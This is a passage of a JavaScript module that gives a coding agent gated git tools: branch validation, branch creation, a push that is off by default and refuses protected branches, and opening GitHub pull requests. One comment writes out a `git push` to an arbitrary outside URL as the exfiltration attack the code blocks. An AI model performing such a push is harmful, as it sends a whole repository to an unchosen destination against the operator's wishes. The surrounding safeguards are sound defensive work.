  }

  const head = await git(root, ['rev-parse', '--short', 'HEAD'], { spawnImpl });
  return {
    ok: true,
    hash: head.ok && head.exitCode === 0 ? head.stdout.trim() : '',
    message: valid.message,
    files: stagedFiles,
    // ⭐ Reported because it is the number a human checks first, and because it
    // differs from `paths.length` whenever a named path was already clean.
    fileCount: stagedFiles.length,
  };
}

// ───────────────────────────────────────────────────────────────────────────
// ⭐⭐ THE DELIVERY HALF — BRANCH, PUSH, PULL REQUEST
//
// ── THE MEASUREMENT THAT MOTIVATED IT (2026-08-14) ─────────────────────────
//     node -e "import('./lib/git.mjs').then(m =>
//       console.log(m.gitToolSchemas().map(t => t.function.name).join(', ')))"
//     -> git_status, git_diff, git_log, git_commit
//
// The agent could commit and then could not deliver. "Finish the work and open
// a PR" is the single most common end-of-task instruction a coding agent gets,
// and the only way to obey it was `--shell`, i.e. handing over the entire
// machine to get one `git push`. A capability gate that is escaped by granting
// a strictly larger one is not a gate, it is a nuisance.
//
// ── ⚠️ AND THE THREE VERBS ARE NOT THE SAME KIND OF THING ──────────────────
// · `git_branch` is nearly free: it touches no remote, destroys nothing, and
//   the worst outcome is a branch nobody wanted, deleted in one command. It
//   rides with `allowRun`, like commit, and needs nothing else.
// · `git_push` LEAVES THE MACHINE. It is visible to colleagues, hard to undo,
//   and it is the only verb in this file that can leak — a repository is
//   exactly the kind of thing you do not want sent somewhere by accident. So it
//   is off unless an operator turns it on BY NAME, refuses protected branches
//   with no override reachable by the model, and can only ever reach a remote
//   the repository already has configured.
// · The pull request needs a network call and a credential, and both already
//   existed in `github.mjs` — unreached, which is this package's signature
//   defect. It is folded into `git_push` rather than given its own schema: a
//   PR without a push is meaningless, the gate is identical, and one fewer
//   schema is ~250 tokens saved on every round of every run.
// ───────────────────────────────────────────────────────────────────────────

/**
 * ⚠️ A BRANCH NAME IS A REF, AND GIT'S RULES FOR ONE ARE NOT OBVIOUS. This is
 * `git check-ref-format --branch` reimplemented as a pure function, because the
 * alternative — hand the string to git and read the error — means a model
 * spends a paid round learning that `feature/../..` is not a name.
 *
 * ⭐ The load-bearing ones are the first two. A leading `-` becomes a FLAG at
 * some call site, and `..`/`@{` are revision syntax: `git switch a..b` is not a
 * branch operation at all. Everything after that is git's own list.
 */
export const MAX_BRANCH_NAME_CHARS = 200;

/**
 * @param {unknown} raw
 * @returns {{ ok: true, name: string } | GitRefused}
 */
export function validateBranchName(raw) {
  if (typeof raw !== 'string') return { ok: false, error: 'a branch name is required' };
  const name = raw.trim();
  if (!name) return { ok: false, error: 'the branch name is empty — say what the branch is for, e.g. "fix/login-timeout"' };
  if (name.length > MAX_BRANCH_NAME_CHARS) {
    return { ok: false, error: `the branch name is ${name.length} characters, over the ${MAX_BRANCH_NAME_CHARS} limit` };
  }
  if (name.startsWith('-')) return { ok: false, error: 'a branch name may not start with "-" — it would be read as a flag' };
  if (/\s/.test(name)) return { ok: false, error: 'a branch name may not contain whitespace — use "-" or "/" instead' };
  // eslint-disable-next-line no-control-regex
  if (/[\u0000-\u001f\u007f]/.test(name)) return { ok: false, error: 'the branch name contains control characters' };
  if (/[~^:?*[\\]/.test(name)) return { ok: false, error: 'a branch name may not contain any of ~ ^ : ? * [ \\ — git refuses them' };
  if (name.includes('..')) return { ok: false, error: 'a branch name may not contain ".." — that is git\'s range syntax, not a name' };
  if (name.includes('@{')) return { ok: false, error: 'a branch name may not contain "@{" — that is git\'s reflog syntax' };
  if (name === '@') return { ok: false, error: '"@" is not a branch name — it is shorthand for HEAD' };
  if (name === 'HEAD') return { ok: false, error: '"HEAD" is not a branch name — it is the pointer to whichever branch you are on' };
  if (name.startsWith('refs/')) return { ok: false, error: 'give the branch name only, without the "refs/heads/" prefix' };
  if (name.startsWith('/') || name.endsWith('/')) return { ok: false, error: 'a branch name may not begin or end with "/"' };
  for (const segment of name.split('/')) {
    if (segment === '') return { ok: false, error: 'a branch name may not contain an empty path segment ("//")' };
    if (segment.startsWith('.')) return { ok: false, error: 'no part of a branch name may begin with "." — git refuses it' };
    if (segment.endsWith('.')) return { ok: false, error: 'no part of a branch name may end with "." — git refuses it' };
    if (segment.endsWith('.lock')) return { ok: false, error: 'no part of a branch name may end with ".lock" — that is git\'s own lockfile suffix' };
  }
  return { ok: true, name };
}

/**
 * Create a branch and switch to it, or switch to one that already exists.
 *
 * ── ⚠️ WHAT IS DELIBERATELY NOT HERE ────────────────────────────────────────
 * No delete, no rename, no `-B`, no `--force`, no `checkout <path>`. Every one
 * of those can destroy work the agent did not create, and the whole argument
 * for structured verbs (see the header) is that a verb you did not write cannot
 * be reached by a model that guesses well.
 *
 * ⭐ REUSED, NOT CLOBBERED, when the branch exists — `github.mjs:createBranch`
 * makes the same choice and states the reason: re-running after a failed
 * attempt is completely normal, and `-B` would silently throw away whatever the
 * last attempt left there.
 *
 * ⚠️ AND THE EXISTENCE PROBE ASKS FOR `refs/heads/<name>` RATHER THAN `<name>`.
 * `git rev-parse --verify <name>` resolves ANY object — a tag, a remote-tracking
 * branch, or a plain abbreviated SHA. A branch called `beef` would come back
 * "exists" because an object starting `beef` does, and we would `switch` to a
 * detached HEAD instead of creating the branch. (`github.mjs:230` still has the
 * bare form; noted there, not fixed from here.)
 */
/**
 * @param {string} root
 * @param {{ name?: unknown, dryRun?: boolean } & GitOpts} [opts]
 * @returns {Promise<GitRefused | { ok: true, branch: string, created: boolean, previous: string, switched: boolean }>}
 */
export async function gitBranch(root, { name, spawnImpl, dryRun = false } = {}) {
  // ⚠️ STRICT: a ref is repository-wide. There is no such thing as creating a
  // branch "for this subdirectory only", so the subdirectory allowance that the
  // read verbs get would be a lie here.
  const repo = await resolveRepo(root, { spawnImpl });
  if (!repo.ok) return repo;

  const valid = validateBranchName(name);
  if (!valid.ok) return valid;

  const head = await git(root, ['rev-parse', '--abbrev-ref', 'HEAD'], { spawnImpl });
  const previous = head.ok && head.exitCode === 0 ? head.stdout.trim() : '';

  if (previous === valid.name) {
    // ⚠️ A RESULT, NOT A FAILURE. The model asked to be on that branch and it
    // is on that branch; reporting an error would send it hunting for a problem
    // that does not exist, which is the same mistake `gitDiff` avoids for an
    // empty diff.
    return { ok: true, branch: valid.name, created: false, switched: false, previous };
  }

  if (dryRun) return { ok: false, error: 'this is a --dry-run, so no branch is created and nothing is switched' };

  const exists = await git(root, ['rev-parse', '--verify', '--quiet', `refs/heads/${valid.name}`], { spawnImpl });
  if (!exists.ok) return exists;
  const existed = exists.exitCode === 0;

  const sw = await git(root, existed ? ['switch', valid.name] : ['switch', '-c', valid.name], { spawnImpl });
  if (!sw.ok) return sw;
  if (sw.exitCode !== 0) {
    const err = `${sw.stdout}\n${sw.stderr}`.trim();
    /**
     * ⚠️ GIT'S OWN ADVICE HERE NAMES `git stash`, WHICH THIS AGENT DOES NOT
     * HAVE. Left unrewritten the model reads the hint, tries to obey it, and
     * burns a round discovering the verb does not exist — the same failure the
     * gitignore branch of `gitCommit` was written to prevent.
     */
    if (/would be overwritten|commit your changes or stash/i.test(err)) {
      return {
        ok: false,
        error: `${err}\n\nThis agent has no stash and never discards changes. Commit the files first with git_commit, then branch.`,
      };
    }
    return { ok: false, error: err || `could not switch to ${valid.name}` };
  }
  return { ok: true, branch: valid.name, created: !existed, switched: true, previous };
}

/**
 * ── ⚠️⚠️ THE PROTECTED BRANCHES, AND WHY THE MODEL CANNOT UNSET THEM ────────
 *
 * There was no branch-protection policy anywhere in this package before today
 * — checked: `grep -rn "protected" lib/*.mjs` returned only compaction and
 * lease matches. So this is a new policy, and a new policy in the one verb that
 * leaves the machine should be conservative and boring.
 *
 * ⭐ THE LIST IS ADDITIVE ONLY. `ACUVO_PROTECTED_BRANCHES` can ADD names; there
 * is no variable, flag or tool argument that removes one. That asymmetry is the
 * point: a safety list a caller can empty is a safety list the model will
 * eventually be told to empty. A human who genuinely means to push `main`
 * types eleven characters in their own terminal.
 *
 * ⭐ AND THE REMOTE'S OWN DEFAULT BRANCH COUNTS, whatever it is called. That is
 * the real protection this repository already has rather than one I invented:
 * `origin/HEAD` is what the hosting provider says the trunk is, so a repo whose
 * trunk is `acuvo` or `closer-local` is covered without anyone configuring
 * anything. ⚠️ It is frequently ABSENT in a clone (git only writes it on
 * `clone`, not on `remote add`), which is exactly why it supplements the static
 * list instead of replacing it.
 */
export const PROTECTED_BRANCHES = Object.freeze([
  'main', 'master', 'develop', 'development', 'trunk', 'release', 'prod', 'production',
]);
export const PROTECTED_BRANCHES_ENV = 'ACUVO_PROTECTED_BRANCHES';

export function protectedBranches(env = process.env) {
  const extra = String(env?.[PROTECTED_BRANCHES_ENV] ?? '')
    .split(',')
    .map((s) => s.trim().toLowerCase())
    .filter(Boolean);
  return [...new Set([...PROTECTED_BRANCHES, ...extra])];
}

/** @returns {string | null} the refusal, or null if this branch may be pushed. */
export function protectedBranchRefusal(branch, { env = process.env, defaultBranch = null } = {}) {
  const name = String(branch ?? '').trim();
  if (!name) return 'could not work out which branch is checked out, so this push is refused';
  const lower = name.toLowerCase();
  const list = protectedBranches(env);
  const isDefault = defaultBranch && lower === String(defaultBranch).trim().toLowerCase();
  if (!list.includes(lower) && !isDefault) return null;
  const why = isDefault && !list.includes(lower)
    ? `"${name}" is the default branch of the remote`
    : `"${name}" is a protected branch`;
  return [
    `${why}, and this agent never pushes to one.`,
    'Make a branch for the work and push that instead:',
    `  git_branch { "name": "fix/what-you-did" }  then  git_push`,
    `(protected here: ${list.join(', ')}${defaultBranch ? `, and the remote default "${defaultBranch}"` : ''}.`,
    `Add more with ${PROTECTED_BRANCHES_ENV}=a,b — there is no way to remove one.)`,
  ].join(' ');
}

/** The operator's switch. ⚠️ Absent means OFF — a push must be asked for. */
export const ALLOW_PUSH_ENV = 'ACUVO_ALLOW_PUSH';

export function pushEnabled(env = process.env) {
  const raw = String(env?.[ALLOW_PUSH_ENV] ?? '').trim().toLowerCase();
  return raw === '1' || raw === 'true' || raw === 'yes' || raw === 'on';
}

/**
 * ⭐ THE OFFER FOLLOWS `mediaToolNames`: a tool whose configuration is absent is
 * never MENTIONED to the model. That is not only safety — it is the cost
 * argument. A schema the model is never shown costs zero tokens, so the default
 * install pays nothing at all for a verb it has not enabled, and the ~170
 * tokens per round are spent only by someone who asked for them.
 */
export function gitPushToolNames(env = process.env, { allowRun = true } = {}) {
  return allowRun && pushEnabled(env) ? ['git_push'] : [];
}

/** A push can be slow on a big repository in a way `status` never is. */
export const PUSH_TIMEOUT_MS = 120_000;

/** What the remote calls its trunk, or null when the clone never recorded it. */
async function remoteDefaultBranch(root, remote, { spawnImpl } = {}) {
  const r = await git(root, ['symbolic-ref', '--quiet', '--short', `refs/remotes/${remote}/HEAD`], { spawnImpl });
  if (!r.ok || r.exitCode !== 0) return null;
  const value = r.stdout.trim();
  if (!value) return null;
  return value.startsWith(`${remote}/`) ? value.slice(remote.length + 1) : value;
}

/**
 * Push the current branch, and optionally open a pull request for it.
 *
 * ── ⚠️ THE ARGV IS FIXED: `push --set-upstream <remote> <branch>` ───────────
 * No `--force`, no `--force-with-lease`, no `--delete`, no `--mirror`, no
 * `--tags`, no refspec. The model supplies a remote NAME that must already be
 * configured and nothing else — which is what stops the obvious attack, since
 * `git push https://somewhere-else/x HEAD` would post the entire repository to
 * an address of the model's choosing and looks exactly like a normal push in a
 * transcript.
 *
 * ⭐ `--set-upstream` is unconditional and idempotent: the FIRST push of a new
 * branch without it leaves the branch with no upstream, and the next `git pull`
 * a human runs in that clone fails with a paragraph of advice.
 */
/**
 * @param {string} root
 * @returns {Promise<GitRefused | { ok: true, remote: string, branch: string, output: string, pullRequest: object | null, nextSteps: string[] }>}
 */
export async function gitPush(root, {
  remote = 'origin',
  openPullRequest = false,
  pullRequestTitle = null,
  pullRequestBody = null,
  pullRequestBase = null,
  spawnImpl,
  dryRun = false,
  env = process.env,
  fetchImpl = fetch,
  detectImpl = null,
  tokenImpl = null,
} = {}) {
  /**
   * ⚠️ THE GATE IS CHECKED HERE AS WELL AS AT THE OFFER, and that is not
   * belt-and-braces for its own sake: `tools.mjs` already learned this the hard
   * way with `repl` and `start_process` (see
   * `test/no-run-holds-at-dispatcher.test.mjs`) — a model can emit a call for a
   * tool it was never shown, from a resumed session or a provider echoing a
   * stale tool list, and a gate that lives only in the offer does not hold.
   */
  if (!pushEnabled(env)) {
    return {
      ok: false,
      error: `pushing is turned off. This agent only pushes when the operator asks for it by name: set ${ALLOW_PUSH_ENV}=1 in the environment. Until then, commit the work and hand the branch over.`,
    };
  }

  const repo = await resolveRepo(root, { spawnImpl });
  if (!repo.ok) return repo;

  /**
   * ⚠️ VALIDATED BEFORE ANYTHING LEAVES THE MACHINE. Discovering that the PR
   * has no title AFTER the push has already happened means reporting a
   * half-done job for a reason that was knowable for free.
   */
  if (openPullRequest) {
    const t = String(pullRequestTitle ?? '').trim();
    if (!t) return { ok: false, error: 'openPullRequest needs a pullRequestTitle — say what the pull request is for' };
    if (t.startsWith('-')) return { ok: false, error: 'a pull request title may not start with "-"' };
  }

  const remoteName = String(remote ?? 'origin').trim() || 'origin';
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(remoteName)) {
    return { ok: false, error: `"${remoteName}" is not a remote name. Pass the NAME of a configured remote (usually "origin") — a URL is not accepted here, because pushing to an arbitrary address would send the whole repository somewhere nobody chose.` };
  }
  const remotes = await git(root, ['remote'], { spawnImpl });
  if (!remotes.ok) return remotes;
  const configured = remotes.stdout.split('\n').map((s) => s.trim()).filter(Boolean);
  if (!configured.includes(remoteName)) {
    return {
      ok: false,
      error: configured.length
        ? `this repository has no remote called "${remoteName}". It has: ${configured.join(', ')}`
        : 'this repository has no remotes configured, so there is nowhere to push to',
    };
  }

  const head = await git(root, ['rev-parse', '--abbrev-ref', 'HEAD'], { spawnImpl });
  if (!head.ok) return head;
  const branch = head.exitCode === 0 ? head.stdout.trim() : '';
  if (!branch || branch === 'HEAD') {
    // ⚠️ DETACHED HEAD. `push origin HEAD` from here creates a ref named after
    // whatever git guesses, on a remote, from a state the user probably did not
    // intend to be in.
    return { ok: false, error: 'HEAD is detached (not on a branch), so there is no branch to push. Use git_branch to make one first.' };
  }

  const defaultBranch = await remoteDefaultBranch(root, remoteName, { spawnImpl });
  const refusal = protectedBranchRefusal(branch, { env, defaultBranch });
  if (refusal) return { ok: false, error: refusal };

  if (dryRun) return { ok: false, error: 'this is a --dry-run, so nothing is pushed' };

  const run = await git(root, ['push', '--set-upstream', remoteName, branch], {
    spawnImpl,
    timeoutMs: PUSH_TIMEOUT_MS,
    env: pushEnvironment(env),
  });
  if (!run.ok) return run;
  if (run.exitCode !== 0) {
    const err = `${run.stdout}\n${run.stderr}`.trim();
    if (/could not read Username|terminal prompts disabled|Authentication failed/i.test(err)) {
      return {
        ok: false,
        error: `${err}\n\nGit has no usable credential for ${remoteName} in this environment. Run the push yourself, or configure a credential helper / ssh agent for this machine.`,
      };
    }
    if (/non-fast-forward|rejected|fetch first/i.test(err)) {
      return {
        ok: false,
        error: `${err}\n\nThe remote has commits this branch does not. This agent never force-pushes and cannot pull — a human needs to reconcile the two.`,
      };
    }
    return { ok: false, error: err || 'git push failed' };
  }

  const pushed = {
    ok: true,
    remote: remoteName,
    branch,
    // ⚠️ Git writes the interesting part of a push to STDERR ("* [new branch]",
    // the remote's own PR hint). Reporting only stdout would report nothing.
    output: clampOutput(`${run.stdout}\n${run.stderr}`.trim(), 2_000).text,
    pullRequest: null,
    nextSteps: [],
  };
  if (!openPullRequest) return pushed;

  pushed.pullRequest = await openPr(root, {
    branch, base: pullRequestBase || defaultBranch, title: String(pullRequestTitle).trim(),
    body: pullRequestBody == null ? '' : String(pullRequestBody), env, fetchImpl, detectImpl, tokenImpl,
  });
  /**
   * ⭐ A FAILED PR DOES NOT UNDO A SUCCESSFUL PUSH, so it must not be reported
   * as a failed push. The commits ARE on the remote; the model needs to know
   * that and stop, not retry the push. The manual command rides along so the
   * human can finish it in one paste.
   */
  if (!pushed.pullRequest.ok) {
    pushed.nextSteps = [`gh pr create --head ${branch}${pullRequestBase ? ` --base ${pullRequestBase}` : ''} --fill`];
  }
  return pushed;
}

/**
 * The pull request itself.
 *
 * ⭐ EVERY PIECE OF THIS ALREADY EXISTED IN `github.mjs` AND NOTHING CALLED IT
 * — `detectRepo` (which asks git rather than guessing from the folder name, and
 * reads `git config` rather than `remote get-url` so a URL rewrite does not
 * make a GitHub repo look like it is not on GitHub) and `findToken` (which
 * reuses `gh auth token`, resolved to an ABSOLUTE path after a `gh.exe` in the
 * working directory was measured beating the real one). Reusing them is the
 * whole point: the unreached-capability defect is fixed by CALLING the code,
 * not by writing a second copy of it.
 */
async function openPr(root, { branch, base, title, body, env, fetchImpl, detectImpl, tokenImpl }) {
  const { detectRepo, findToken } = await import('./github.mjs');
  const detect = detectImpl ?? detectRepo;
  const token = tokenImpl ?? findToken;

  const where = detect(root);
  if (!where.ok) return { ok: false, error: `cannot open a pull request: ${where.error}` };
  const cred = token({ env });
  if (!cred.ok) return { ok: false, error: cred.error };

  const payload = { title, head: branch, base: base || 'main', body: body.slice(0, 60_000) };
  let res;
  try {
    res = await fetchImpl(`https://api.github.com/repos/${where.owner}/${where.repo}/pulls`, {
      method: 'POST',
      headers: {
        accept: 'application/vnd.github+json',
        authorization: `Bearer ${cred.token}`,
        'content-type': 'application/json',
        'user-agent': 'acuvo-code',
      },
      body: JSON.stringify(payload),
      signal: AbortSignal.timeout(20_000),
    });
  } catch (err) {
    return { ok: false, error: `could not reach GitHub: ${err?.cause?.code ?? err?.name ?? err}` };
  }
  const json = await res.json().catch(() => null);
  if (res.status === 201 && json) {
    return { ok: true, number: json.number, url: json.html_url, base: payload.base };
  }
  /**
   * ⚠️ 422 IS THE ONE THAT MATTERS AND IT IS AMBIGUOUS. GitHub returns it for
   * "a pull request already exists for this branch" AND for "the base branch
   * does not exist" AND for "no commits between the two". Its own `message`
   * distinguishes them, so it is passed through rather than replaced by a guess.
   */
  const detail = json?.errors?.map?.((e) => e?.message).filter(Boolean).join('; ') || json?.message || '';
  return { ok: false, error: `GitHub refused the pull request (HTTP ${res.status})${detail ? `: ${detail}` : ''}` };
}

/** Render for the model — compact, and leading with the fact that drives the next move. */
export function formatStatusForModel(result) {
  if (!result.ok) return `git status: ${result.error}`;
  /**
   * ⭐ THE SCOPE IS SAID OUT LOUD. "working tree clean" about a workspace that
   * is one package of a monorepo is a true sentence a model will read as a
   * bigger claim than it is — and the next thing it does with that belief is
   * decide the repository has nothing to commit.
   */
  const scope = result.subdirectory ? ` (scoped to ${result.subdirectory}/ inside a larger repository)` : '';
  if (result.clean) return `branch ${result.branch || '(no commits yet)'}${scope} — working tree clean, nothing to commit`;
  const lines = [`branch ${result.branch || '(no commits yet)'}${scope} — ${result.files.length} changed:`];
  for (const f of result.files.slice(0, 60)) {
    const tag = f.untracked ? 'untracked' : f.staged ? 'staged' : 'modified';
    lines.push(`  ${tag.padEnd(9)} ${f.path}`);
  }
  if (result.files.length > 60) lines.push(`  … and ${result.files.length - 60} more`);
  return lines.join('\n');
}

export function gitToolSchemas() {
  return [
    {
      type: 'function',
      function: {
        name: 'git_status',
        description: [
          'List what has changed in the workspace repository: branch, and every modified, staged or',
          'untracked file. Call this BEFORE git_commit — commit requires you to name the files, and',
          'this is how you know what they are.',
        ].join(' '),
        parameters: { type: 'object', properties: {}, required: [] },
      },
    },
    {
      type: 'function',
      function: {
        name: 'git_diff',
        description: [
          'Show the actual line-by-line changes in the working tree. This is how you CHECK your own',
          'edit did what you meant before committing it, and how you see changes that existed before',
          'this session. Optionally limit to one path, or pass staged=true for what is already staged.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            path: { type: 'string', description: 'Optional workspace-relative file or directory.' },
            staged: { type: 'boolean', description: 'true to diff what is staged rather than the working tree.' },
          },
          required: [],
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'git_log',
        description: [
          'Recent commits: hash, author, relative date and subject. Use it to learn a repository\'s',
          'commit-message conventions before writing one, or to see what recently changed in a file.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            count: { type: 'number', description: `How many commits, 1–${MAX_LOG_COUNT} (default 10).` },
            path: { type: 'string', description: 'Optional path — only commits touching it.' },
          },
          required: [],
        },
      },
    },
    {
      type: 'function',
      function: {
        name: 'git_commit',
        description: [
          'Stage the named files and commit them. You MUST list the paths — there is no "commit',
          'everything", because sweeping up files you have not looked at is how scratch files and',
          'secrets get committed. Call git_status and git_diff first, then commit deliberately.',
          'Match the repository\'s existing message style (git_log shows it).',
          'This agent cannot reset, merge, rebase or discard anything — commit, branch and push are the only write verbs.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            message: { type: 'string', description: 'The commit message. Multi-line is fine.' },
            paths: {
              type: 'array',
              items: { type: 'string' },
              description: 'Workspace-relative paths to stage and commit. Required, and non-empty.',
            },
          },
          required: ['message', 'paths'],
        },
      },
    },
    /**
     * ⭐ ~95 TOKENS, AND IT EARNS THEM ON THE FIRST TASK THAT SAYS "don't commit
     * to main". Without it the agent's only correct move was to refuse the work
     * or commit to whatever branch it happened to start on.
     */
    {
      type: 'function',
      function: {
        name: 'git_branch',
        description: [
          'Create a branch and switch to it — or switch to one that already exists. Do this BEFORE',
          'committing work that should not land on the branch you started on. It never force-creates,',
          'never deletes a branch, and never discards commits.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            name: { type: 'string', description: 'The branch name, e.g. "fix/login-timeout". No spaces.' },
          },
          required: ['name'],
        },
      },
    },
    /**
     * ⚠️ THIS SCHEMA IS ~180 TOKENS AND IS SHOWN TO NOBODY BY DEFAULT — see
     * `gitPushToolNames`. It is declared here anyway so the registry, the
     * doctor and the policy validator can all SEE it; what varies per machine
     * is the offer, which is the convention `tools.mjs` states for the media
     * tools and follows here.
     */
    {
      type: 'function',
      function: {
        name: 'git_push',
        description: [
          'Push the current branch to a remote, and optionally open a pull request for it.',
          'This is the one action that LEAVES THIS MACHINE and that other people will see, so use it',
          'when the task asked you to deliver the work — not as a reflex after every commit.',
          'It refuses to push a protected branch (main, master, develop, trunk, release, prod,',
          'production, and whatever the remote calls its default): branch with git_branch first.',
          'It never force-pushes and never deletes a remote branch.',
        ].join(' '),
        parameters: {
          type: 'object',
          properties: {
            remote: { type: 'string', description: 'Name of a configured remote — default "origin". A URL is refused.' },
            openPullRequest: { type: 'boolean', description: 'true to open a GitHub pull request after the push succeeds.' },
            pullRequestTitle: { type: 'string', description: 'Required when openPullRequest is true.' },
            pullRequestBody: { type: 'string', description: 'The PR description. Say what changed and how you verified it.' },
            pullRequestBase: { type: 'string', description: 'Branch to merge into. Defaults to the remote\'s default branch.' },
          },
          required: [],
        },
      },
    },
  ];
}
